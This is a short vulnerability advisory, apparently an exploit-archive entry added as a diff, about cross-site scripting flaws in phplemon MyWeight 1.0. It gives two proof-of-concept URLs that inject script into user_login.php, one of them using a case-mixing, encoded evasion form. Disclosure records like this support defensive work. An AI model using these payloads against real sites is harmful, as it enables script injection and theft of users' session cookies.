@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/43488/info
+  
+MyWeight is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+  
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+  
+phplemon MyWeight 1.0 is vulnerable; others versions may be affected. 
+
+http://www.example.com/user_login.php?info=1<script>alert(311454197400)</script>
+http://www.example.com/user_login.php?info=7&return=1>\"><ScRiPt+%0A%0D>alert(390214587228)%3B<%2FScRiPt>
+
